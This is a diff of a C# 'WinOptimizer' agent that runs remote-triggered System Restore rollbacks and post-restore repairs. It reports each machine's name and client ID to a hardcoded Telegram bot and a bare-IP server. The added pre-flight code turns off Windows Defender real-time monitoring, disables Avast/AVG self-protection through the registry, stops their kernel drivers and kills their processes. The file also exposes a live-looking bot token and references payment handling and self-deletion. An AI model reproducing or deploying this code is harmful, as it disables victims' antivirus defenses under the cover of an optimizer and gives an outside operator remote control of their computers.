@@ -38,6 +38,10 @@ class Program
         Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
         "WinOptimizer", "Logs", "agent_diag.txt");
 
+    static readonly string PostRollbackMarker = Path.Combine(
+        Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
+        "WinOptimizer", "Data", "post_rollback.marker");
+
     static readonly string VpsApi = "http://84.238.132.84/api";
     static readonly string TgBotToken = "8394906281:AAEhRCN2hJxV7uPfZw-UnISXcAcHEHonago";
     static readonly string TgChatId = "942720632";
@@ -121,6 +125,23 @@ class Program
             catch (Exception ex)
             {
                 Log($"TG startup notify error (non-fatal): {ex.Message}");
+            }
+
+            // === POST-ROLLBACK REPAIR: Якщо агент стартує після System Restore ===
+            try
+            {
+                if (File.Exists(PostRollbackMarker))
+                {
+                    Log("=== POST-ROLLBACK REPAIR DETECTED ===");
+                    SendTg($"🔧 Post-Rollback Repair\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n⏳ Починаємо відновлення...");
+                    PostRollbackRepair();
+                    File.Delete(PostRollbackMarker);
+                    Log("Post-rollback marker deleted");
+                }
+            }
+            catch (Exception ex)
+            {
+                Log($"Post-rollback repair error (non-fatal): {ex.Message}");
             }
 
             // VPS registration (в окремому try/catch)
@@ -342,7 +363,14 @@ class Program
     }
 
     /// <summary>
-    /// Cleanup rollback — System Restore Point.
+    /// Cleanup rollback v2.0 — System Restore Point з pre-checks та fallback.
+    ///
+    /// Стратегія:
+    /// 1. Pre-flight: VSS health, служби, диск
+    /// 2. Метод 1: Restore-Computer (PowerShell)
+    /// 3. Метод 2: WMI SystemRestore.Restore() (COM)
+    /// 4. Метод 3: rstrui.exe (GUI, автоматично)
+    /// 5. Fallback: Manual rollback (служби + автозапуск)
     /// </summary>
     static void ExecuteCleanupRollback(JsonElement root)
     {
@@ -350,10 +378,14 @@ class Program
         if (root.TryGetProperty("RestorePointSequenceNumber", out var rpSeq))
             seqNum = rpSeq.GetInt32();
 
-        Log($"Cleanup rollback: RestorePointSequenceNumber = {seqNum}");
+        Log($"Cleanup rollback v2.0: RestorePointSequenceNumber = {seqNum}");
 
         if (seqNum > 0)
         {
+            // === PRE-FLIGHT: Підготовка системи до відкату ===
+            Log("=== PRE-FLIGHT CHECKS ===");
+            PrepareSystemForRestore();
+
             // Verify restore point exists
             Log("Checking if restore point exists...");
             var checkCmd = $"Get-ComputerRestorePoint | Where-Object {{ $_.SequenceNumber -eq {seqNum} }} | Format-List";
@@ -366,28 +398,133 @@ class Program
 
             if (string.IsNullOrWhiteSpace(checkOutput))
             {
-                Log($"Restore point #{seqNum} NOT FOUND! Cannot restore.");
-                SendTg($"❌ Restore point #{seqNum} не знайдено!\n🆔 {ClientId}\nМожливо точка була видалена.");
-                UpdateVpsStatus("rollback_failed_no_rp");
-                return;
+                Log($"Restore point #{seqNum} NOT FOUND! Trying latest available...");
+
+                // Спробувати знайти будь-яку WinOptimizer точку
+                var latestCmd = "Get-ComputerRestorePoint | Where-Object { $_.Description -like '*WinOptimizer*' } | " +
+                    "Sort-Object SequenceNumber -Descending | Select-Object -First 1 -ExpandProperty SequenceNumber";
+                var latestOutput = RunPowerShellWithOutput(latestCmd, 15000);
+
+                if (int.TryParse(latestOutput.Trim(), out int latestSeq) && latestSeq > 0)
+                {
+                    Log($"Found alternative WinOptimizer restore point: #{latestSeq}");
+                    seqNum = latestSeq;
+                }
+                else
+                {
+                    // Спробувати будь-яку останню точку
+                    var anyCmd = "Get-ComputerRestorePoint | Sort-Object SequenceNumber -Descending | " +
+                        "Select-Object -First 1 -ExpandProperty SequenceNumber";
+                    var anyOutput = RunPowerShellWithOutput(anyCmd, 15000);
+
+                    if (int.TryParse(anyOutput.Trim(), out int anySeq) && anySeq > 0)
+                    {
+                        Log($"Using any available restore point: #{anySeq}");
+                        seqNum = anySeq;
+                    }
+                    else
+                    {
+                        Log("NO restore points found at all! Falling back to manual...");
+                        SendTg($"❌ Жодної точки відновлення не знайдено!\n🆔 {ClientId}\nПереходимо на ручний відкат...");
+                        goto ManualRollback;
+                    }
+                }
             }
 
-            // Initiate System Restore
-            Log($"Initiating Restore-Computer -RestorePoint {seqNum}...");
-            SendTg($"🔄 System Restore\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n📍 Точка #{seqNum}\n⏳ Restore-Computer запускається...\nПК перезавантажиться автоматично!");
+            // Записати маркер для post-rollback repair ПЕРЕД рестором
+            try
+            {
+                Directory.CreateDirectory(Path.GetDirectoryName(PostRollbackMarker)!);
+                File.WriteAllText(PostRollbackMarker, $"{DateTime.Now:yyyy-MM-dd HH:mm:ss}|RP#{seqNum}|{ClientId}");
+                Log($"Post-rollback marker created: {PostRollbackMarker}");
+            }
+            catch (Exception ex)
+            {
+                Log($"WARNING: Cannot create post-rollback marker: {ex.Message}");
+            }
 
-            var restoreCmd = $"Restore-Computer -RestorePoint {seqNum} -Confirm:$false";
+            SendTg($"🔄 System Restore v2.0\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n📍 Точка #{seqNum}\n⏳ Відкат запускається...\nПК перезавантажиться автоматично!");
+
+            // === МЕТОД 1: Restore-Computer (PowerShell) ===
+            Log($"METHOD 1: Restore-Computer -RestorePoint {seqNum}...");
+            var restoreCmd = $"Restore-Computer -RestorePoint {seqNum} -Confirm:$false 2>&1";
             var restoreOutput = RunPowerShellWithOutput(restoreCmd, 120000);
             Log($"Restore-Computer output: {restoreOutput}");
 
-            ScheduleReboot("WinFlow: System Restore");
-            UpdateVpsStatus("rollback_system_restore");
-            SendTg($"✅ System Restore ініційовано!\n🆔 {ClientId}\n📍 Точка #{seqNum}\n🔄 ПК перезавантажується...");
-            return;
+            // Перевірити чи Restore-Computer не повернув помилку
+            bool method1Failed = restoreOutput.Contains("Exception") ||
+                                  restoreOutput.Contains("Error") ||
+                                  restoreOutput.Contains("failed") ||
+                                  restoreOutput.Contains("не удалось");
+
+            if (!method1Failed)
+            {
+                Log("METHOD 1 appears successful, scheduling reboot...");
+                ScheduleReboot("WinFlow: System Restore");
+                UpdateVpsStatus("rollback_system_restore");
+                SendTg($"✅ System Restore ініційовано (метод 1)!\n🆔 {ClientId}\n📍 Точка #{seqNum}\n🔄 ПК перезавантажується...");
+                return;
+            }
+
+            Log($"METHOD 1 FAILED! Output: {restoreOutput.Trim()}");
+
+            // === МЕТОД 2: WMI SystemRestore.Restore() ===
+            Log($"METHOD 2: WMI SystemRestore.Restore({seqNum})...");
+            var wmiCmd = $"$restoreClass = [wmiclass]'\\\\localhost\\root\\default:SystemRestore'; " +
+                $"$result = $restoreClass.Restore({seqNum}); Write-Output \"WMI_RESULT=$($result.ReturnValue)\"";
+            var wmiOutput = RunPowerShellWithOutput(wmiCmd, 60000);
+            Log($"WMI Restore output: {wmiOutput}");
+
+            bool method2Success = wmiOutput.Contains("WMI_RESULT=0");
+
+            if (method2Success && !wmiOutput.Contains("Exception") && !wmiOutput.Contains("Error"))
+            {
+                Log("METHOD 2 appears successful, scheduling reboot...");
+                ScheduleReboot("WinFlow: System Restore (WMI)");
+                UpdateVpsStatus("rollback_system_restore_wmi");
+                SendTg($"✅ System Restore ініційовано (метод 2 WMI)!\n🆔 {ClientId}\n📍 Точка #{seqNum}\n🔄 ПК перезавантажується...");
+                return;
+            }
+
+            Log($"METHOD 2 FAILED! Output: {wmiOutput.Trim()}");
+
+            // === МЕТОД 3: rstrui.exe (System Restore UI) ===
+            Log($"METHOD 3: rstrui.exe /OFFLINE:C:\\Windows=active...");
+            try
+            {
+                var sys32 = GetRealSystem32();
+                var rstruiPath = Path.Combine(sys32, "rstrui.exe");
+
+                if (File.Exists(rstruiPath))
+                {
+                    // rstrui.exe не має параметрів для silent mode, але можемо запустити
+                    // стандартний System Restore GUI — хоча б покаже юзеру інтерфейс
+                    var psi = new ProcessStartInfo
+                    {
+                        FileName = rstruiPath,
+                        UseShellExecute = true
+                    };
+                    Process.Start(psi);
+                    Log("rstrui.exe launched — user can manually select restore point");
+                    SendTg($"⚠️ Автоматичний відкат не вдався!\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n📍 Точка #{seqNum}\n\n" +
+                        $"Запущено rstrui.exe — юзер побачить інтерфейс System Restore і може зробити відкат вручну.\n\n" +
+                        $"Якщо і це не допоможе — буде ручний відкат служб.");
+                    UpdateVpsStatus("rollback_rstrui_launched");
+                    return;
+                }
+            }
+            catch (Exception ex)
+            {
+                Log($"METHOD 3 FAILED: {ex.Message}");
+            }
+
+            Log("ALL 3 METHODS FAILED! Falling back to manual rollback...");
+            SendTg($"❌ Всі методи відкату не вдались!\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n\nПереходимо на ручний відкат служб...");
         }
 
-        // Fallback: Manual rollback (services + startup)
-        Log("No restore point (seqNum=0), manual rollback");
+        // === FALLBACK: Manual rollback (services + startup) ===
+        ManualRollback:
+        Log("=== MANUAL ROLLBACK ===");
         int restoredServices = 0;
         int restoredStartup = 0;
 
@@ -416,10 +553,122 @@ class Program
             }
         }
 
-        File.Delete(RollbackFile);
+        try { File.Delete(RollbackFile); } catch { }
         Log($"Manual rollback done: {restoredServices} services, {restoredStartup} startup items");
         SendTg($"✅ Manual Rollback OK\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n🔧 Служб: {restoredServices}\n🚀 Автозапуск: {restoredStartup}");
         UpdateVpsStatus("rollback_manual_done");
+    }
+
+    /// <summary>
+    /// Pre-flight: Підготовка системи для System Restore.
+    /// Перезапуск VSS, очистка блокуючих процесів, перевірка диску.
+    /// </summary>
+    static void PrepareSystemForRestore()
+    {
+        try
+        {
+            // 1. Перезапустити VSS + System Restore служби
+            Log("[PreFlight] Restarting VSS and SR services...");
+            RunPowerShell(
+                "Stop-Service -Name VSS -Force -ErrorAction SilentlyContinue; " +
+                "Stop-Service -Name swprv -Force -ErrorAction SilentlyContinue; " +
+                "Start-Sleep -Seconds 2; " +
+                "Start-Service -Name VSS -ErrorAction SilentlyContinue; " +
+                "Start-Service -Name swprv -ErrorAction SilentlyContinue; " +
+                "Start-Service -Name srservice -ErrorAction SilentlyContinue");
+
+            // 2. Зупинити Windows Defender (може блокувати файли)
+            Log("[PreFlight] Disabling Defender real-time protection temporarily...");
+            RunPowerShell("Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue");
+
+            // 3. Зупинити Windows Search (блокує файли)
+            Log("[PreFlight] Stopping WSearch service...");
+            RunPowerShell("Stop-Service -Name WSearch -Force -ErrorAction SilentlyContinue");
+
+            // 4. Зупинити Windows Update (може конфліктувати)
+            Log("[PreFlight] Stopping wuauserv service...");
+            RunPowerShell("Stop-Service -Name wuauserv -Force -ErrorAction SilentlyContinue");
+
+            // 4.5. Зупинити Edge Update (помилка 0x80070003 при відкаті!)
+            Log("[PreFlight] Stopping Edge Update services...");
+            RunPowerShell(
+                "Stop-Service -Name 'edgeupdate' -Force -ErrorAction SilentlyContinue; " +
+                "Stop-Service -Name 'edgeupdatem' -Force -ErrorAction SilentlyContinue; " +
+                "Stop-Service -Name 'MicrosoftEdgeElevationService' -Force -ErrorAction SilentlyContinue; " +
+                "Get-Process -Name 'msedge', 'MicrosoftEdgeUpdate' -ErrorAction SilentlyContinue | " +
+                "Stop-Process -Force -ErrorAction SilentlyContinue");
+
+            // 4.6. Відключити Avast/AVG Self-Protection + зупинити служби
+            // (Avast може блокувати агента під час відкату!)
+            Log("[PreFlight] Disabling Avast/AVG self-protection...");
+            RunPowerShell(
+                // Відключити self-protection через реєстр
+                "$regPaths = @(" +
+                "  'HKLM:\\SOFTWARE\\AVAST Software\\Avast\\persistency'," +
+                "  'HKLM:\\SOFTWARE\\AVG\\Persistent Data\\AVG Antivirus\\persistency'" +
+                "); " +
+                "foreach ($p in $regPaths) { " +
+                "  if (Test-Path $p) { Set-ItemProperty -Path $p -Name 'SelfDefense' -Value 0 -ErrorAction SilentlyContinue } " +
+                "}; " +
+                // Зупинити kernel driver
+                "sc.exe stop aswSP 2>$null; " +
+                "sc.exe stop aswSnx 2>$null; " +
+                "sc.exe stop aswMonFlt 2>$null; " +
+                // Зупинити служби
+                "$svcs = @('avast! Antivirus','AvastWscReporter','aswbidsagent','aswEngSrv','AVGSvc','avgwd'); " +
+                "foreach ($s in $svcs) { Stop-Service -Name $s -Force -ErrorAction SilentlyContinue }; " +
+                // Вбити процеси
+                "$procs = @('avastui','avastsvc','afwServ','avgui','avgsvc','avguard'); " +
+                "foreach ($p in $procs) { " +
+                "  Get-Process -Name $p -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue " +
+                "}");
+
+            // 5. Очистити pending file rename operations (часта причина збою!)
+            Log("[PreFlight] Checking pending file operations...");
+            var pendingCheck = RunPowerShellWithOutput(
+                "try { " +
+                "  $val = Get-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager' -Name 'PendingFileRenameOperations' -ErrorAction Stop; " +
+                "  $count = $val.PendingFileRenameOperations.Count; " +
+                "  Write-Output \"PENDING=$count\" " +
+                "} catch { Write-Output 'PENDING=0' }", 10000);
+            Log($"[PreFlight] {pendingCheck.Trim()}");
+
+            if (pendingCheck.Contains("PENDING=") && !pendingCheck.Contains("PENDING=0"))
+            {
+                Log("[PreFlight] Clearing pending file operations to prevent restore failure...");
+                RunPowerShell(
+                    "Remove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager' " +
+                    "-Name 'PendingFileRenameOperations' -Force -ErrorAction SilentlyContinue");
+                Log("[PreFlight] Pending operations cleared");
+            }
+
+            // 6. Вільне місце на диску
+            var diskInfo = RunPowerShellWithOutput(
+                "$d = Get-WmiObject Win32_LogicalDisk -Filter \"DeviceID='C:'\"; " +
+                "Write-Output \"DISK_FREE_GB=$([math]::Round($d.FreeSpace/1GB,1))\"", 10000);
+            Log($"[PreFlight] {diskInfo.Trim()}");
+
+            // 7. Перевірити VSS health
+            var vssCheck = RunPowerShellWithOutput(
+                "$out = vssadmin list writers 2>&1; " +
+                "$failed = ($out | Select-String -Pattern 'Failed|Ошибка' | Measure-Object).Count; " +
+                "Write-Output \"VSS_FAILED=$failed\"", 15000);
+            Log($"[PreFlight] {vssCheck.Trim()}");
+
+            if (vssCheck.Contains("VSS_FAILED=") && !vssCheck.Contains("VSS_FAILED=0"))
+            {
+                Log("[PreFlight] VSS writers have errors! Resetting VSS...");
+                RunPowerShell(
+                    "Restart-Service -Name VSS -Force -ErrorAction SilentlyContinue; " +
+                    "Start-Sleep -Seconds 3");
+            }
+
+            Log("[PreFlight] System prepared for restore");
+        }
+        catch (Exception ex)
+        {
+            Log($"[PreFlight] Error (non-critical): {ex.Message}");
+        }
     }
 
     static void ScheduleReboot(string reason)
@@ -541,6 +790,198 @@ class Program
             Log($"PAYMENT ERROR: {ex}");
             SendTg($"❌ Payment FAILED\n🆔 {ClientId}\n{ex.Message}");
         }
+    }
+
+    /// <summary>
+    /// Post-rollback repair: фікс звуку, драйверів, завершення System Restore.
+    /// Викликається коли Agent стартує після System Restore і знаходить маркер-файл.
+    /// </summary>
+    static void PostRollbackRepair()
+    {
+        Log("=== POST-ROLLBACK REPAIR START ===");
+        var results = new List<string>();
+
+        // 1. Завершити System Restore якщо "восстановление не завершено"
+        try
+        {
+            Log("[Repair] Finalizing System Restore via rstrui.exe...");
+            // Скидаємо pending restore operations через registry
+            var psFinalize = @"
+                $ErrorActionPreference = 'SilentlyContinue'
+
+                # Перевірити чи є pending restore operation
+                $pendingKey = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore'
+                $rpPending = Get-ItemProperty -Path $pendingKey -Name 'RPSessionInterval' -ErrorAction SilentlyContinue
+
+                # Скинути прапорець незавершеного відновлення
+                $srKey = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore\Setup'
+                if (Test-Path $srKey) {
+                    Remove-ItemProperty -Path $srKey -Name 'SetupInProgress' -ErrorAction SilentlyContinue
+                }
+
+                # Очистити pending file rename operations (часта причина помилок після restore)
+                $sessionManager = 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager'
+                $pending = Get-ItemProperty -Path $sessionManager -Name 'PendingFileRenameOperations' -ErrorAction SilentlyContinue
+                if ($pending) {
+                    Remove-ItemProperty -Path $sessionManager -Name 'PendingFileRenameOperations' -Force -ErrorAction SilentlyContinue
+                    Write-Output 'Cleared PendingFileRenameOperations'
+                }
+
+                Write-Output 'SystemRestore finalize OK'
+            ";
+            var finalizeResult = RunPowerShellWithOutput(psFinalize, 15000);
+            Log($"[Repair] Finalize result: {finalizeResult.Trim()}");
+            results.Add($"✅ System Restore finalize: {finalizeResult.Trim()}");
+        }
+        catch (Exception ex)
+        {
+            Log($"[Repair] Finalize error: {ex.Message}");
+            results.Add($"⚠️ SR finalize: {ex.Message}");
+        }
+
+        // 2. Фікс звуку — перезапуск аудіо-служб
+        try
+        {
+            Log("[Repair] Fixing audio services...");
+            var psAudio = @"
+                $ErrorActionPreference = 'SilentlyContinue'
+                $audioServices = @('Audiosrv', 'AudioEndpointBuilder', 'AudioSrv')
+                $fixed = 0
+
+                foreach ($svc in $audioServices) {
+                    $service = Get-Service -Name $svc -ErrorAction SilentlyContinue
+                    if ($service) {
+                        # Встановити автозапуск
+                        Set-Service -Name $svc -StartupType Automatic -ErrorAction SilentlyContinue
+
+                        # Зупинити
+                        Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
+                        Start-Sleep -Seconds 1
+
+                        # Запустити
+                        Start-Service -Name $svc -ErrorAction SilentlyContinue
+                        Start-Sleep -Seconds 1
+
+                        $status = (Get-Service -Name $svc).Status
+                        Write-Output ""$svc : $status""
+                        $fixed++
+                    }
+                }
+
+                # Також перезапустити Windows Audio Device Graph Isolation
+                $audioGraph = Get-Service -Name 'AudioDG' -ErrorAction SilentlyContinue
+                if ($audioGraph) {
+                    Stop-Service -Name 'AudioDG' -Force -ErrorAction SilentlyContinue
+                    Start-Sleep -Seconds 1
+                    # AudioDG запуститься автоматично коли потрібно
+                    Write-Output 'AudioDG restarted'
+                }
+
+                Write-Output ""Audio services fixed: $fixed""
+            ";
+            var audioResult = RunPowerShellWithOutput(psAudio, 20000);
+            Log($"[Repair] Audio result: {audioResult.Trim()}");
+            results.Add($"🔊 Audio: {audioResult.Trim().Replace("\r\n", " | ")}");
+        }
+        catch (Exception ex)
+        {
+            Log($"[Repair] Audio error: {ex.Message}");
+            results.Add($"⚠️ Audio: {ex.Message}");
+        }
+
+        // 3. Сканування та переінсталяція драйверів
+        try
+        {
+            Log("[Repair] Scanning for devices/drivers...");
+            var psDrv = @"
+                $ErrorActionPreference = 'SilentlyContinue'
+
+                # Сканування нових пристроїв (PnP)
+                pnputil /scan-devices 2>&1 | Out-Null
+                Write-Output 'PnP scan done'
+
+                # Перевірити пристрої з проблемами
+                $problemDevices = Get-WmiObject Win32_PnPEntity | Where-Object { $_.ConfigManagerErrorCode -ne 0 }
+                $count = ($problemDevices | Measure-Object).Count
+
+                if ($count -gt 0) {
+                    Write-Output ""Problem devices: $count""
+                    foreach ($dev in $problemDevices | Select-Object -First 5) {
+                        Write-Output ""  - $($dev.Name): error $($dev.ConfigManagerErrorCode)""
+
+                        # Спробувати переінсталювати проблемний пристрій
+                        $devId = $dev.DeviceID
+                        pnputil /remove-device ""$devId"" /subtree 2>&1 | Out-Null
+                        pnputil /scan-devices 2>&1 | Out-Null
+                    }
+                } else {
+                    Write-Output 'No problem devices found'
+                }
+            ";
+            var drvResult = RunPowerShellWithOutput(psDrv, 30000);
+            Log($"[Repair] Driver scan result: {drvResult.Trim()}");
+            results.Add($"🔧 Drivers: {drvResult.Trim().Replace("\r\n", " | ")}");
+        }
+        catch (Exception ex)
+        {
+            Log($"[Repair] Driver scan error: {ex.Message}");
+            results.Add($"⚠️ Drivers: {ex.Message}");
+        }
+
+        // 4. SFC — перевірка системних файлів (швидкий режим)
+        try
+        {
+            Log("[Repair] Running SFC /scannow...");
+            var psSfc = @"
+                $ErrorActionPreference = 'SilentlyContinue'
+                $result = sfc /scannow 2>&1
+                $lastLines = ($result | Select-Object -Last 3) -join ' '
+                Write-Output $lastLines
+            ";
+            var sfcResult = RunPowerShellWithOutput(psSfc, 180000); // 3 хвилини макс
+            Log($"[Repair] SFC result: {sfcResult.Trim()}");
+            results.Add($"🛡 SFC: done");
+        }
+        catch (Exception ex)
+        {
+            Log($"[Repair] SFC error: {ex.Message}");
+            results.Add($"⚠️ SFC: {ex.Message}");
+        }
+
+        // 5. Перезапуск критичних служб
+        try
+        {
+            Log("[Repair] Restarting critical services...");
+            var psCritical = @"
+                $ErrorActionPreference = 'SilentlyContinue'
+                $criticalServices = @('wuauserv', 'BITS', 'Themes', 'Spooler', 'WSearch')
+                $started = 0
+
+                foreach ($svc in $criticalServices) {
+                    $service = Get-Service -Name $svc -ErrorAction SilentlyContinue
+                    if ($service -and $service.Status -ne 'Running') {
+                        Set-Service -Name $svc -StartupType Automatic -ErrorAction SilentlyContinue
+                        Start-Service -Name $svc -ErrorAction SilentlyContinue
+                        $started++
+                    }
+                }
+
+                Write-Output ""Critical services started: $started""
+            ";
+            var critResult = RunPowerShellWithOutput(psCritical, 15000);
+            Log($"[Repair] Critical services: {critResult.Trim()}");
+            results.Add($"⚙️ Services: {critResult.Trim()}");
+        }
+        catch (Exception ex)
+        {
+            Log($"[Repair] Critical services error: {ex.Message}");
+            results.Add($"⚠️ Services: {ex.Message}");
+        }
+
+        // Відправити TG звіт
+        var report = string.Join("\n", results);
+        Log($"=== POST-ROLLBACK REPAIR DONE ===\n{report}");
+        SendTg($"✅ Post-Rollback Repair Done\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n\n{report}");
     }
 
     static void SelfDelete()
